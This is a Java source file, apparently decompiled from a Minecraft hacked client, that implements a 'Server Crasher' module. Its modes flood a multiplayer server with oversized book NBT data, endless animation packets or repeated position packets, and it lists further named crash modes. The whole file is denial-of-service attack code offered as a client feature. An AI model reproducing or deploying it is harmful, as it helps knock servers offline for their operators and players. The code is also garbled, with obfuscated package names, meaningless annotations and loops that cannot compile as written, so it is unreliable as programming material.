package com.nquantum.module.exploit;

import com.nquantum.*;
import com.nquantum.event.*;
import com.nquantum.module.*;
import com.nquantum.event.impl.*;
import net.minecraft.init.*;
import net.minecraft.item.*;
import net.minecraft.nbt.*;
import com.nquantum.notification.*;
import net.minecraft.network.*;
import com.nquantum.util.time.*;
import net.minecraft.network.play.client.*;
import java.util.*;
import ok.ok.ok.ok.ok.ok.ok.ok.ok.ok.ok.ok.ok.ok.ok.settings.*;

public class Crasher extends Module
{
    @Punjabi
    public void onPacket(final EventSendPacket eventSendPacket) {
        Asyncware.instance.settingsManager.getSettingByName("Crasher Mode").getValString();
    }
    
    public Crasher() {
        super("Server Crasher", 0, Category.EXPLOIT);
    }
    
    @Punjabi
    @Override
    public void onUpdate(final EventUpdate eventUpdate) {
        final String valString = Asyncware.instance.settingsManager.getSettingByName("Crasher Mode").getValString();
        if (valString.equalsIgnoreCase("Book")) {
            if (this.mc.thePlayer.getHeldItem() != new ItemStack(Items.writable_book)) {
                final ItemStack itemStack = new ItemStack(Items.writable_book);
                final NBTTagCompound nbtTagCompound = new NBTTagCompound();
                nbtTagCompound.setString("author", new Random().nextInt(20) + "");
                nbtTagCompound.setString("title", new Random().nextInt(20) + "");
                final NBTTagList list = new NBTTagList();
                final String string = new Random().nextInt(600) + "";
                while (true) {
                    list.appendTag(new NBTTagString(string));
                    int n = 0;
                    ++n;
                }
            }
            else {
                NotificationManager.show(new Notification(NotificationType.ERROR, "Cannot crash", "You need to hold book in case to do that!", 3));
            }
        }
        if (valString.equalsIgnoreCase("Switch")) {
            while (true) {
                this.mc.getNetHandler().addToSendQueue(new C0APacketAnimation());
                int n2 = 0;
                ++n2;
            }
        }
        else {
            if (!valString.equalsIgnoreCase("Chunk")) {
                if (valString.equalsIgnoreCase("AACOld")) {
                    final Timer timer = new Timer();
                }
                return;
            }
            for (double posY = this.mc.thePlayer.posY; posY < 255.0; posY += 5.0) {
                this.mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(this.mc.thePlayer.posX, posY, this.mc.thePlayer.posZ, true));
            }
            while (true) {
                this.mc.getNetHandler().addToSendQueue(new C03PacketPlayer.C04PacketPlayerPosition(this.mc.thePlayer.posX + 0, 255.0, this.mc.thePlayer.posZ + 0, true));
                final int n2;
                n2 += 5;
            }
        }
    }
    
    @Override
    public void setup() {
        super.setup();
        final ArrayList<String> list = new ArrayList<String>();
        list.add("Book");
        list.add("Cubecraft");
        list.add("Kokscraft");
        list.add("Chunk");
        list.add("WorldEdit");
        list.add("AACOld");
        list.add("Pex");
        list.add("Switch");
        Asyncware.instance.settingsManager.rSetting(new Setting("Crasher Mode", this, "Book", list));
    }
}
